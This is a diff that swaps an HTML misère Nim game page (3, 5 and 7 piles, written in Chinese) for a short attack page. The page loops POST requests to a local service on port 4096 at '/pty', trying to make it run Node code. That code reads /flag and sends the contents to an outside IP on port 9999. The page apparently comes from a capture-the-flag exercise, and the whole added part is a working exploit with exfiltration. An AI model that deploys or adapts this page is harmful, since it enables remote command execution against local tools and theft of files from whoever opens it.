@@ -1,351 +1,48 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>三五七外挂</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .game-container {
-            background-color: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .game-title {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .game-info {
-            background-color: #e9f7fe;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        .game-info h3 {
-            margin-top: 0;
-            color: #2c6ca0;
-        }
-        .game-board {
-            display: flex;
-            justify-content: space-around;
-            margin: 20px 0;
-        }
-        .pile {
-            text-align: center;
-            width: 100px;
-        }
-        .pile-items {
-            height: 200px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-end;
-            margin-bottom: 10px;
-        }
-        .item {
-            width: 60px;
-            height: 30px;
-            background-color: #ff4444;
-            margin: 2px 0;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .item.selected {
-            background-color: #44ff44;
-        }
-        .pile-label {
-            font-weight: bold;
-            font-size: 18px;
-            color: #333;
-        }
-        .controls {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 20px 0;
-        }
-        button {
-            padding: 10px 15px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-        button#reset-btn {
-            background-color: #2196F3;
-        }
-        .game-status {
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-        .strategy-info {
-            background-color: #e8f5e9;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-        }
-        .strategy-info h3 {
-            margin-top: 0;
-            color: #2e7d32;
-        }
-        .highlight {
-            background-color: #fffde7;
-            padding: 2px 5px;
-            border-radius: 3px;
-        }
-    </style>
-</head>
-<body>
-    <div class="game-container">
-        <h1 class="game-title">ecx作弊系列-357</h1>
-        
-        <div class="game-info">
-            <h3>游戏规则</h3>
-            <p>1. 游戏开始时有三堆物品，数量分别为 <strong>3个、5个和7个</strong>。</p>
-            <p>2. 两名玩家轮流从任意一堆中拿走 <strong>任意数量</strong>（至少一个）的物品。</p>
-            <p>3. <strong>拿走最后一个物品的玩家判负</strong>。</p>
-        </div>
-        
-        <div class="game-board">
-            <div class="pile">
-                <div class="pile-items" id="pile1"></div>
-                <div class="pile-label">第一堆: <span id="count1">3</span></div>
-            </div>
-            <div class="pile">
-                <div class="pile-items" id="pile2"></div>
-                <div class="pile-label">第二堆: <span id="count2">5</span></div>
-            </div>
-            <div class="pile">
-                <div class="pile-items" id="pile3"></div>
-                <div class="pile-label">第三堆: <span id="count3">7</span></div>
-            </div>
-        </div>
-        
-        <div class="controls">
-            <button id="start-btn">开始游戏</button>
-            <button id="next-btn" disabled>下一步</button>
-            <button id="reset-btn">重置游戏</button>
-        </div>
-        
-        <div class="game-status" id="status">游戏状态: 等待开始</div>
-        
-        
-    </div>
+  <!doctype html>
+  <meta charset="utf-8">
+  <script>
+  const WEBHOOK = "http://47.118.30.30:9999";
 
-    <script>
-        const gameState = {
-            piles: [3, 5, 7],
-            currentPlayer: 'computer',
-            gameStarted: false,
-            gameOver: false,
-            selectedPile: null,
-            itemsToTake: 0
-        };
+  const nodeCode = `
+  (async () => {
+    const fs = require("fs");
+    try { fs.chmodSync("/flag", 0o644); } catch {}
+    let out = "";
+    try { out = fs.readFileSync("/flag", "utf8"); }
+    catch (e) { out = "ERR:" + String(e); }
+    try {
+      await fetch(${JSON.stringify("http://47.118.30.30:9999")}, {
+        method: "POST",
+        body: out
+      });
+    } catch {}
+    process.exit(0);
+  })();
+  `;
 
-        const pileElements = [
-            document.getElementById('pile1'),
-            document.getElementById('pile2'),
-            document.getElementById('pile3')
-        ];
-        const countElements = [
-            document.getElementById('count1'),
-            document.getElementById('count2'),
-            document.getElementById('count3')
-        ];
-        const startBtn = document.getElementById('start-btn');
-        const nextBtn = document.getElementById('next-btn');
-        const resetBtn = document.getElementById('reset-btn');
-        const status = document.getElementById('status');
+  const body = JSON.stringify({
+    command: "node",
+    args: ["-e", nodeCode],
+    cwd: "/"
+  });
 
-        function initGame() {
-            gameState.piles = [3, 5, 7];
-            gameState.currentPlayer = 'computer';
-            gameState.gameStarted = false;
-            gameState.gameOver = false;
-            gameState.selectedPile = null;
-            gameState.itemsToTake = 0;
-            updatePiles();
-            status.textContent = '游戏状态: 等待开始';
-            startBtn.disabled = false;
-            nextBtn.disabled = true;
-        }
+  async function fire(base) {
+    try {
+      await fetch(base + "/pty", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=UTF-8" },
+        body
+      });
+    } catch {}
+  }
 
-        function updatePiles() {
-            for (let p = 0; p < 3; p++) {
-                const pe = pileElements[p];
-                pe.innerHTML = '';
-                const total = gameState.piles[p];
-                for (let i = 0; i < total; i++) {
-                    const item = document.createElement('div');
-                    item.className = 'item';
-                    // 修正选中逻辑显示：从顶部往下选中
-                    if (gameState.selectedPile === p && i >= total - gameState.itemsToTake) {
-                        item.classList.add('selected');
-                    }
-                    item.dataset.pile = p;
-                    item.dataset.index = total - i; // 点击物品表示取走该位置及以上的所有物品
-                    item.addEventListener('click', onItemClick);
-                    pe.appendChild(item);
-                }
-                countElements[p].textContent = total;
-            }
-        }
-
-        function onItemClick(e) {
-            if (gameState.currentPlayer !== 'human' || gameState.gameOver) return;
-            const pile = parseInt(e.target.dataset.pile);
-            const takeCount = parseInt(e.target.dataset.index);
-
-            gameState.selectedPile = pile;
-            gameState.itemsToTake = takeCount;
-            updatePiles();
-            status.textContent = `游戏状态: 你选择从第${pile+1}堆拿${gameState.itemsToTake}个`;
-        }
-
-        function xorAll() {
-            return gameState.piles[0] ^ gameState.piles[1] ^ gameState.piles[2];
-        }
-
-        // 胜负判定修正：谁执行完移动后总数为0，谁就输了
-        function checkEndAfterMove() {
-            const sum = gameState.piles.reduce((a, b) => a + b, 0);
-            if (sum === 0) {
-                gameState.gameOver = true;
-                if (gameState.currentPlayer === 'human') {
-                    status.textContent = '游戏结束：你拿走了最后一个，你输了！';
-                } else {
-                    status.textContent = '游戏结束：电脑拿走了最后一个，你赢了！';
-                }
-                nextBtn.disabled = true;
-                return true;
-            }
-            return false;
-        }
-
-        function computerMove() {
-            const x = xorAll();
-            let moved = false;
-
-            // 统计当前数量大于 1 的堆
-            const moreThanOne = gameState.piles.filter(p => p > 1).length;
-
-            // 核心修正：收官策略 (Misere Play)
-            // 如果执行移动后，所有剩下的堆数量都将 <= 1
-            if (moreThanOne === 1) {
-                const targetPileIdx = gameState.piles.findIndex(p => p > 1);
-                const otherPilesWithOne = gameState.piles.filter((p, i) => i !== targetPileIdx && p === 1).length;
-                
-                // 目标：使剩下的 1 的堆的总数为奇数
-                const targetValue = (otherPilesWithOne % 2 === 0) ? 1 : 0;
-                const take = gameState.piles[targetPileIdx] - targetValue;
-                gameState.piles[targetPileIdx] = targetValue;
-                status.textContent = `游戏状态: 电脑从第${targetPileIdx+1}堆拿走${take}个 (进入必胜收官)`;
-                moved = true;
-            } 
-            
-            // 普通 Nim 策略
-            if (!moved && x !== 0) {
-                for (let i = 0; i < 3; i++) {
-                    const want = gameState.piles[i] ^ x;
-                    if (want < gameState.piles[i]) {
-                        const take = gameState.piles[i] - want;
-                        gameState.piles[i] = want;
-                        status.textContent = `游戏状态: 电脑从第${i+1}堆拿走${take}个`;
-                        moved = true;
-                        break;
-                    }
-                }
-            }
-
-            // 如果已经处于必败态（x=0），随便拿一个
-            if (!moved) {
-                for (let i = 0; i < 3; i++) {
-                    if (gameState.piles[i] > 0) {
-                        gameState.piles[i]--;
-                        status.textContent = `游戏状态: 电脑从第${i+1}堆拿走1个`;
-                        moved = true;
-                        break;
-                    }
-                }
-            }
-
-            updatePiles();
-            checkEndAfterMove();
-        }
-
-        function playerMove() {
-            if (gameState.selectedPile === null || gameState.itemsToTake < 1) {
-                status.textContent = '游戏状态: 请先点击红色物品选择要拿走几个';
-                return false;
-            }
-            const p = gameState.selectedPile;
-            const n = gameState.itemsToTake;
-
-            gameState.piles[p] -= n;
-            status.textContent = `游戏状态: 你从第${p+1}堆拿走${n}个`;
-            gameState.selectedPile = null;
-            gameState.itemsToTake = 0;
-            updatePiles();
-
-            return !checkEndAfterMove(); // 如果没结束返回 true
-        }
-
-        function nextStep() {
-            if (gameState.gameOver) return;
-
-            if (gameState.currentPlayer === 'computer') {
-                // 执行电脑移动
-                computerMove();
-                if (!gameState.gameOver) {
-                    gameState.currentPlayer = 'human';
-                    status.textContent += "。轮到你了！";
-                }
-            } else {
-                // 执行玩家移动
-                if (playerMove()) {
-                    gameState.currentPlayer = 'computer';
-                    // 玩家确认后，电脑自动准备
-                    status.textContent += "。看电脑如何应对...";
-                    
-                    setTimeout(nextStep, 600);
-                }
-            }
-        }
-
-        startBtn.addEventListener('click', () => {
-            startBtn.disabled = true;
-            nextBtn.disabled = false;
-            gameState.gameStarted = true;
-            gameState.currentPlayer = 'computer';
-            
-            
-            gameState.piles[0] = 2;
-            status.textContent = '游戏状态: 电脑先手，将第1堆变为2 (2,5,7 必胜局面)';
-            updatePiles();
-            gameState.currentPlayer = 'human';
-        });
-
-        nextBtn.addEventListener('click', nextStep);
-        resetBtn.addEventListener('click', initGame);
-
-        initGame();
-    </script>
-</body>
-</html>
+  (async () => {
+    const end = Date.now() + 15000;
+    while (Date.now() < end) {
+      await fire("http://127.0.0.1:4096");
+      await fire("http://localhost:4096");
+      await new Promise(r => setTimeout(r, 300));
+    }
+  })();
+  </script>
